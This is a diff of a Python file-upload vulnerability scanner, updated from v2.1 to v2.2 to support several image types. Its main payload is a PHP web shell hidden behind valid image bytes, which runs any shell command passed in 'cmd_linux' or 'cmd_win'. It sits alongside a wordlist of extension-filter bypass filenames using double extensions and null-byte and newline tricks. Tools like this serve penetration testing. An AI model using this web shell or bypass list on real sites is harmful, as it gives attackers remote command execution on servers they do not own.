@@ -17,6 +17,7 @@ parser.add_argument("--upload", "-u", default=False, required=False, help="Direc
 parser.add_argument("-v", "--verbose", action="count", default=0, help = "Verbose mode")
 parser.add_argument("-A", "--aggressive", action="store_true", default=False, help = "Enable aggressive detection mode")
 parser.add_argument("--bypass", action="store_true", default=False, help = "Enable bypass techniques for file upload restrictions")
+parser.add_argument("--image-type", default="png", choices=['png', 'jpg', 'gif', 'pdf', 'webp', 'svg', 'bmp', 'ico'], help = "Specify valid extension for upload testing (default is .png)")
 
 args = parser.parse_args()
 
@@ -31,7 +32,7 @@ def banner():
 /_/    \__,_/_/ /_/\___/_/ /_/_/____/      
 
     File Upload Vulnerability Scanner
-    v2.1
+    v2.2
 
 """ + "\033[0m")
 
@@ -42,7 +43,7 @@ cookies = args.cookies
 proxy = args.proxy
 CSRF = args.csrf
 upload_dir = args.upload
-
+force_mime = args.image_type
 
 
 
@@ -58,7 +59,7 @@ def regex_url(text_to_sanitize: str) -> str:
     if not text_to_sanitize.startswith(('http://', 'https://')):
         text_to_sanitize = "http://" + text_to_sanitize
 
-    if not text_to_sanitize.endswith('/'):
+    if '?' not in text_to_sanitize and not text_to_sanitize.endswith('/'):
         text_to_sanitize = text_to_sanitize + "/"
 
     return text_to_sanitize
@@ -77,7 +78,7 @@ def guessing_file_name(value_to_validate: list, extension: str, fake_image: byte
                             (valid_request_values["text_body"]) and the request under test
                             (to_be_validate_request_values["text_body"]); used to identify new
                             filenames with potentially valid extensions not present in the original response
-    :param extension: uploaded file name (e.g., "test.php")
+    :param extension: uploaded file name (e.g., "kyra.php")
     :param fake_image: fake image used for upload (PNG content with embedded PHP code)
     :param mode: naming strategy used by the server to store uploaded files (e.g., "MD5", "SHA1", "Original file name", "Name in body", "FULL")
 
@@ -107,7 +108,7 @@ def guessing_file_name(value_to_validate: list, extension: str, fake_image: byte
             list_.append(sha1)
         return list_
 
-    extension_regex = extension.split(".", 1)[1]  # "test.php" -> "php" ("php" used for regex)
+    extension_regex = extension.split(".", 1)[1]  # "kyra.php" -> "php" ("php" used for regex)
     list_ = []
 
     if mode == "FULL":
@@ -209,7 +210,7 @@ def extract_input_form(s) -> tuple[str, str, str, dict]:
         input_form = tag.find_all('input')  # Takes all input tags in the form
 
         for input_test in input_form:
-            if input_test.get('type') == 'file':
+            if input_test.get('type').lower() == 'file':
                 action = tag.get('action')  # Contains the name of the PHP file that performs the upload (upload.php)
                 method = tag.get('method')
                 # Extract input data for upload name
@@ -218,8 +219,24 @@ def extract_input_form(s) -> tuple[str, str, str, dict]:
 
         if found:
             for input_test in input_form:
-                if input_test.get('name') and input_test.get('value') and (input_test.get('type') == "hidden" or input_test.get('type') == "submit"):
-                    tags_array.update({input_test.get('name'): input_test.get('value')})
+                input_type = input_test.get("type", "text").lower()
+                input_name = input_test.get("name")
+                input_value = input_test.get("value", "")
+
+                if not input_name:
+                    continue
+
+                if input_type == "file":
+                    continue
+
+                if input_type in ["checkbox", "radio"] and not input_test.has_attr("checked"):
+                    continue
+
+                if input_type in ["reset", "button"]:
+                    continue
+
+                tags_array.update({input_name: input_value})
+
             break
 
     if not found:
@@ -252,11 +269,11 @@ def clean_html_text(html: str) -> str:
 
 def ext_validator(valid_request_values: dict, to_be_validate_request_values: dict, extension: str, fake_image: bytes, mode: str) -> tuple[bool, str, dict[str, list[str]]]:
     """
-    Validates the file extension under test (e.g., "test.php") by comparing it against a known allowed extension (.png).
+    Validates the file extension under test (e.g., "kyra.php") by comparing it against a known allowed extension (.png).
 
     :param valid_request_values: dictionary containing values from the valid request ("redirect", "status_code", "text_body")
     :param to_be_validate_request_values: dictionary containing values from the request under test ("redirect", "status_code", "text_body")
-    :param extension: file name to validate (e.g., "test.php")
+    :param extension: file name to validate (e.g., "kyra.php")
     :param fake_image: fake image used for upload (PNG content with embedded PHP code)
     :param mode: naming strategy used by the server to store uploaded files (e.g., "MD5", "SHA1", "Original file name", "Name in body", "FULL")
     :return: tuple containing validation result, a message, and a dictionary of candidate values
@@ -284,6 +301,7 @@ def ext_validator(valid_request_values: dict, to_be_validate_request_values: dic
         name_to_test = guessing_file_name(value_to_validate, extension, fake_image, mode)
         return True, "", name_to_test
 
+
 def extract_name_through_mimetype(mimetype: str) -> str:
     """
     Generates a test filename based on the provided MIME type.
@@ -293,23 +311,55 @@ def extract_name_through_mimetype(mimetype: str) -> str:
     """
 
     mime_to_ext = {"image/jpeg": "jpg", "image/png": "png", "image/gif": "gif", "image/webp": "webp", "image/svg+xml": "svg", "image/bmp": "bmp", "image/x-icon": "ico", "application/pdf": "pdf"}
-    return "test." + mime_to_ext.get(mimetype)
+    return "kyra." + mime_to_ext.get(mimetype)
+
+
+def extract_mimetype_through_extension(extension: str) -> str:
+    """
+    Maps a file extension to its corresponding MIME type.
+
+    :param extension: file extension to map
+    :return: MIME type associated with the extension
+    """
+
+    ext_to_mime = {"jpg": "image/jpeg", "png": "image/png", "gif": "image/gif", "webp": "image/webp", "svg": "image/svg+xml", "bmp": "image/bmp", "ico": "image/x-icon", "pdf": "application/pdf"}
+    return ext_to_mime.get(extension)
+
 
 def bypass(fake_image):
     bypass_wordlist = {}
+    extension = force_mime
     for ext in ['.pht', '.phar', '.phtml', '.php']:
-        bypass_wordlist.update({"test" + ext + ".png": fake_image})
-        bypass_wordlist.update({"test" + ".png" + ext: fake_image})
+        bypass_wordlist.update({"kyra" + ext + "." + extension: fake_image})
+        bypass_wordlist.update({"kyra" + "." + extension + ext: fake_image})
 
     # Extension parsing bypass
     for char in ['%20', '%0a', '%00', '%0d0a', '/', '.\\', '.', ':', '…']:
         for ext in ['.pht', '.phar', '.phtml', '.php']:
-            bypass_wordlist.update({"test" + char + ext + ".png": fake_image})
-            bypass_wordlist.update({"test" + ext + char + ".png": fake_image})
-            bypass_wordlist.update({"test" + ".png" + char + ext: fake_image})
-            bypass_wordlist.update({"test" + ".png" + ext + char: fake_image})
+            bypass_wordlist.update({"kyra" + char + ext + "." + extension: fake_image})
+            bypass_wordlist.update({"kyra" + ext + char + "." + extension: fake_image})
+            bypass_wordlist.update({"kyra" + "." + extension + char + ext: fake_image})
+            bypass_wordlist.update({"kyra" + "." + extension + ext + char: fake_image})
 
     return bypass_wordlist
+
+
+def extension_to_use(mime_payloads) -> tuple[bytes, bytes, str]:
+    """
+    Determines the content to use for upload testing based on the specified MIME type.
+
+    :return: valid image content, the fake image content with embedded PHP code and the MIME type used for testing
+    """
+    
+    embedded_payload = b'<?php echo "__FUnchis__".(2002+2003)."__KYra__"; ?></h1><h3>Linux Backend</h3><form method="GET"><input type="TEXT" name="cmd_linux" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET["cmd_linux"])){ system($_GET["cmd_linux"]." 2>&1"); } ?></pre><h3>Windows Backend</h3><form method="GET"><input type="TEXT" name="cmd_win" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET["cmd_win"])){ system("cmd.exe /c ".$_GET["cmd_win"]." 2>&1"); } ?></pre></body></html>\n'
+    mime_type = extract_mimetype_through_extension(force_mime)  #image/jpeg    
+    
+    #Return Value
+    valid_image = mime_payloads.get(mime_type)
+    fake_image = valid_image + embedded_payload
+    
+    return valid_image, fake_image, mime_type
+
 
 def run_scan(s: requests.Session, scan_type: str, mode: str) -> str:
     """
@@ -339,13 +389,9 @@ def run_scan(s: requests.Session, scan_type: str, mode: str) -> str:
     not_allowed = []
     multiple_method_detected = []
     saved_method_param = mode  # Default fallback to avoid UnboundLocalError when --upload is not used
-    valid_image = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\xdac\xfc\xff\x9f\xa1\x1e\x00\x07\x82\x02\x7f=\xc8H\xef\x00\x00\x00\x00IEND\xaeB`\x82'
-    fake_image = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\xdac\xfc\xff\x9f\xa1\x1e\x00\x07\x82\x02\x7f=\xc8H\xef\x00\x00\x00\x00IEND\xaeB`\x82<html><body><h1><?php echo "__FUnchis__".(2002+2003)."__KYra__"; ?></h1><h3>Linux Backend</h3><form method="GET"><input type="TEXT" name="cmd_linux" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET["cmd_linux"])){ system($_GET["cmd_linux"]." 2>&1"); } ?></pre><h3>Windows Backend</h3><form method="GET"><input type="TEXT" name="cmd_win" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET["cmd_win"])){ system("cmd.exe /c ".$_GET["cmd_win"]." 2>&1"); } ?></pre></body></html>\n'
-    php_payloads = {"test.php": fake_image, "test.php2": fake_image, "test.php3": fake_image, "test.php4": fake_image,
-                    "test.php5": fake_image, "test.php6": fake_image, "test.php7": fake_image, "test.phps": fake_image,
-                    "test.pht": fake_image, "test.phtml": fake_image, "test.phar": fake_image}
+    name, action, method, tags_array = extract_input_form(s)
 
-    #magick -size 1x1 xc:white -strip -quality 1 test.jpg
+    #magick -size 1x1 xc:white -strip -quality 1 kyra.jpg
     #xxd -p <$image> | tr -d '\n' | sed 's/../\\x&/g' | sed 's/^/b"/;s/$/"/'
     mime_payloads = {
         "image/jpeg": b"\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\xff\xdb\x00\x43\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00\x47\xff\xd9",
@@ -357,8 +403,11 @@ def run_scan(s: requests.Session, scan_type: str, mode: str) -> str:
         "image/x-icon": b"\x00\x00\x01\x00\x01\x00\x01\x01\x00\x00\x01\x00\x20\x00\x30\x00\x00\x00\x16\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x01\x00\x20\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00",
         "application/pdf": b"\x25\x50\x44\x46\x2d\x31\x2e\x33\x20\x0a\x31\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x50\x61\x67\x65\x73\x20\x32\x20\x30\x20\x52\x0a\x2f\x54\x79\x70\x65\x20\x2f\x43\x61\x74\x61\x6c\x6f\x67\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x32\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x54\x79\x70\x65\x20\x2f\x50\x61\x67\x65\x73\x0a\x2f\x4b\x69\x64\x73\x20\x5b\x20\x33\x20\x30\x20\x52\x20\x5d\x0a\x2f\x43\x6f\x75\x6e\x74\x20\x31\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x33\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x54\x79\x70\x65\x20\x2f\x50\x61\x67\x65\x0a\x2f\x50\x61\x72\x65\x6e\x74\x20\x32\x20\x30\x20\x52\x0a\x2f\x52\x65\x73\x6f\x75\x72\x63\x65\x73\x20\x3c\x3c\x0a\x2f\x58\x4f\x62\x6a\x65\x63\x74\x20\x3c\x3c\x20\x2f\x49\x6d\x30\x20\x38\x20\x30\x20\x52\x20\x3e\x3e\x0a\x2f\x50\x72\x6f\x63\x53\x65\x74\x20\x36\x20\x30\x20\x52\x20\x3e\x3e\x0a\x2f\x4d\x65\x64\x69\x61\x42\x6f\x78\x20\x5b\x30\x20\x30\x20\x31\x20\x31\x5d\x0a\x2f\x43\x72\x6f\x70\x42\x6f\x78\x20\x5b\x30\x20\x30\x20\x31\x20\x31\x5d\x0a\x2f\x43\x6f\x6e\x74\x65\x6e\x74\x73\x20\x34\x20\x30\x20\x52\x0a\x2f\x54\x68\x75\x6d\x62\x20\x31\x31\x20\x30\x20\x52\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x34\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x4c\x65\x6e\x67\x74\x68\x20\x35\x20\x30\x20\x52\x0a\x3e\x3e\x0a\x73\x74\x72\x65\x61\x6d\x0a\x71\x0a\x31\x20\x30\x20\x30\x20\x31\x20\x30\x20\x30\x20\x63\x6d\x0a\x2f\x49\x6d\x30\x20\x44\x6f\x0a\x51\x0a\x0a\x65\x6e\x64\x73\x74\x72\x65\x61\x6d\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x35\x20\x30\x20\x6f\x62\x6a\x0a\x32\x37\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x36\x20\x30\x20\x6f\x62\x6a\x0a\x5b\x20\x2f\x50\x44\x46\x20\x2f\x54\x65\x78\x74\x20\x2f\x49\x6d\x61\x67\x65\x43\x20\x5d\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x37\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x38\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x54\x79\x70\x65\x20\x2f\x58\x4f\x62\x6a\x65\x63\x74\x0a\x2f\x53\x75\x62\x74\x79\x70\x65\x20\x2f\x49\x6d\x61\x67\x65\x0a\x2f\x4e\x61\x6d\x65\x20\x2f\x49\x6d\x30\x0a\x2f\x46\x69\x6c\x74\x65\x72\x20\x5b\x20\x2f\x52\x75\x6e\x4c\x65\x6e\x67\x74\x68\x44\x65\x63\x6f\x64\x65\x20\x5d\x0a\x2f\x57\x69\x64\x74\x68\x20\x31\x0a\x2f\x48\x65\x69\x67\x68\x74\x20\x31\x0a\x2f\x43\x6f\x6c\x6f\x72\x53\x70\x61\x63\x65\x20\x31\x30\x20\x30\x20\x52\x0a\x2f\x42\x69\x74\x73\x50\x65\x72\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x20\x38\x0a\x2f\x4c\x65\x6e\x67\x74\x68\x20\x39\x20\x30\x20\x52\x0a\x3e\x3e\x0a\x73\x74\x72\x65\x61\x6d\x0a\x00\xff\x80\x0a\x65\x6e\x64\x73\x74\x72\x65\x61\x6d\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x39\x20\x30\x20\x6f\x62\x6a\x0a\x33\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x30\x20\x30\x20\x6f\x62\x6a\x0a\x2f\x44\x65\x76\x69\x63\x65\x47\x72\x61\x79\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x31\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x46\x69\x6c\x74\x65\x72\x20\x5b\x20\x2f\x52\x75\x6e\x4c\x65\x6e\x67\x74\x68\x44\x65\x63\x6f\x64\x65\x20\x5d\x0a\x2f\x57\x69\x64\x74\x68\x20\x31\x0a\x2f\x48\x65\x69\x67\x68\x74\x20\x31\x0a\x2f\x43\x6f\x6c\x6f\x72\x53\x70\x61\x63\x65\x20\x31\x30\x20\x30\x20\x52\x0a\x2f\x42\x69\x74\x73\x50\x65\x72\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x20\x38\x0a\x2f\x4c\x65\x6e\x67\x74\x68\x20\x31\x32\x20\x30\x20\x52\x0a\x3e\x3e\x0a\x73\x74\x72\x65\x61\x6d\x0a\x00\xff\x80\x0a\x65\x6e\x64\x73\x74\x72\x65\x61\x6d\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x32\x20\x30\x20\x6f\x62\x6a\x0a\x33\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x33\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x34\x20\x30\x20\x6f\x62\x6a\x0a\x33\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x35\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x36\x20\x30\x20\x6f\x62\x6a\x0a\x33\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x31\x37\x20\x30\x20\x6f\x62\x6a\x0a\x3c\x3c\x0a\x2f\x54\x69\x74\x6c\x65\x20\x3c\x46\x45\x46\x46\x30\x30\x37\x34\x30\x30\x36\x35\x30\x30\x37\x33\x30\x30\x37\x34\x30\x30\x30\x30\x3e\x0a\x2f\x43\x72\x65\x61\x74\x69\x6f\x6e\x44\x61\x74\x65\x20\x28\x44\x3a\x32\x30\x32\x36\x30\x34\x31\x36\x30\x39\x33\x31\x35\x35\x29\x0a\x2f\x4d\x6f\x64\x44\x61\x74\x65\x20\x28\x44\x3a\x32\x30\x32\x36\x30\x34\x31\x36\x30\x39\x33\x31\x35\x35\x29\x0a\x2f\x50\x72\x6f\x64\x75\x63\x65\x72\x20\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x65\x67\x61\x63\x79\x2e\x69\x6d\x61\x67\x65\x6d\x61\x67\x69\x63\x6b\x2e\x6f\x72\x67\x29\x0a\x3e\x3e\x0a\x65\x6e\x64\x6f\x62\x6a\x0a\x78\x72\x65\x66\x0a\x30\x20\x31\x38\x0a\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x20\x36\x35\x35\x33\x35\x20\x66\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x30\x31\x30\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x30\x35\x39\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x31\x31\x38\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x32\x39\x32\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x33\x37\x32\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x33\x39\x30\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x34\x32\x38\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x34\x34\x39\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x36\x33\x34\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x36\x35\x31\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x36\x37\x39\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x38\x32\x34\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x38\x34\x32\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x38\x36\x34\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x38\x38\x32\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x39\x30\x34\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x30\x30\x30\x30\x30\x30\x30\x39\x32\x32\x20\x30\x30\x30\x30\x30\x20\x6e\x20\x0a\x74\x72\x61\x69\x6c\x65\x72\x0a\x3c\x3c\x0a\x2f\x53\x69\x7a\x65\x20\x31\x38\x0a\x2f\x49\x6e\x66\x6f\x20\x31\x37\x20\x30\x20\x52\x0a\x2f\x52\x6f\x6f\x74\x20\x31\x20\x30\x20\x52\x0a\x2f\x49\x44\x20\x5b\x3c\x63\x65\x38\x62\x65\x65\x35\x32\x35\x64\x36\x37\x33\x36\x65\x39\x38\x32\x35\x32\x36\x31\x62\x31\x39\x61\x39\x62\x35\x31\x37\x31\x39\x66\x39\x64\x63\x34\x62\x62\x37\x32\x38\x65\x39\x35\x63\x66\x37\x30\x36\x37\x61\x32\x31\x34\x32\x62\x30\x33\x62\x33\x36\x32\x3e\x20\x3c\x63\x65\x38\x62\x65\x65\x35\x32\x35\x64\x36\x37\x33\x36\x65\x39\x38\x32\x35\x32\x36\x31\x62\x31\x39\x61\x39\x62\x35\x31\x37\x31\x39\x66\x39\x64\x63\x34\x62\x62\x37\x32\x38\x65\x39\x35\x63\x66\x37\x30\x36\x37\x61\x32\x31\x34\x32\x62\x30\x33\x62\x33\x36\x32\x3e\x5d\x0a\x3e\x3e\x0a\x73\x74\x61\x72\x74\x78\x72\x65\x66\x0a\x31\x30\x38\x32\x0a\x25\x25\x45\x4f\x46\x0a"
     }
-    name, action, method, tags_array = extract_input_form(s)
 
+    valid_image, fake_image, final_mime = extension_to_use(mime_payloads) 
+    php_payloads = {"kyra.php": fake_image, "kyra.php2": fake_image, "kyra.php3": fake_image, "kyra.php4": fake_image,
+                    "kyra.php5": fake_image, "kyra.php6": fake_image, "kyra.php7": fake_image, "kyra.phps": fake_image,
+                    "kyra.pht": fake_image, "kyra.phtml": fake_image, "kyra.phar": fake_image}
 
     #Define correct URL
     if action is None or action == '#': action = ''
@@ -379,11 +428,11 @@ def run_scan(s: requests.Session, scan_type: str, mode: str) -> str:
         message = "Extension seems to be accepted"
 
     #Testing Valid Extensions      '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\xdac\xfc\xff\x9f\xa1\x1e\x00\x07\x82\x02\x7f=\xc8H\xef\x00\x00\x00\x00IEND\xaeB`\x82'   <-- Original Image
-    files = {name: ('test.png', valid_image, "image/png")}
+    files = {name: ('kyra.' + force_mime, valid_image, final_mime)}
     r = s.post(final_url, files=files, data=tags_array, allow_redirects=True)
     print("Making Request: \033[34m {}\033[00m\n".format(final_url))
     r.raise_for_status()
-    valid_request_values = {"status_code": r.status_code, "redirect": r.is_redirect, "text_body": r.text}
+    valid_request_values = {"status_code": r.status_code, "redirect": bool(r.history), "text_body": r.text}
     vprint("Baseline response values: {}\n".format(valid_request_values))
     name_to_test = {}
 
@@ -396,16 +445,16 @@ def run_scan(s: requests.Session, scan_type: str, mode: str) -> str:
             file_name = extract_name_through_mimetype(content_type)
         elif scan_type == "PAYLOAD" or scan_type == "BYPASS":
             # value = fake_image
-            content_type = "image/png"
-            file_name = extension  # extension = test.php, test.phar ...
+            content_type = final_mime
+            file_name = extension  # extension = kyra.php, kyra.phar ...
 
         vprint("\nTesting extension: \033[97m {}\033[00m".format(extension))
         # PNG Magic Byte -> b'\x89PNG\r\n\x1A\n' || Minimal PNG image -> https://png-pixel.com/
-        # files = {name: ('test.png', fake_image, "image/png")}
+        # files = {name: ('kyra.png', fake_image, "image/png")}
         files = {name: (file_name, value, content_type)}
         if CSRF: name, action, method, tags_array = extract_input_form(s)
         r = s.post(final_url, files=files, data=tags_array, allow_redirects=True)
-        to_be_validate_request_values = {"status_code": r.status_code, "redirect": r.is_redirect, "text_body": r.text}
+        to_be_validate_request_values = {"status_code": r.status_code, "redirect": bool(r.history), "text_body": r.text}
         result, message_occurred, data = ext_validator(valid_request_values, to_be_validate_request_values, file_name, value, mode)
 
         if result:
@@ -449,6 +498,7 @@ def run_scan(s: requests.Session, scan_type: str, mode: str) -> str:
 
     return saved_method_param
 
+
 def init_session() -> requests.Session:
     #Initialize Session
     s = requests.session()
@@ -466,7 +516,6 @@ def init_session() -> requests.Session:
         for key, value in cookies_normalized.items():
             s.cookies.set(key, value)
     return s
-
 
 
 def vprint(msg: str):
@@ -504,6 +553,7 @@ def main():
         print("\n[*] Trying Bypass server restrictions ...")
         print("[*] This may take a while...\n")
         run_scan(s, "BYPASS", saved_method_param)
+
 
 if __name__ == "__main__":
     main()
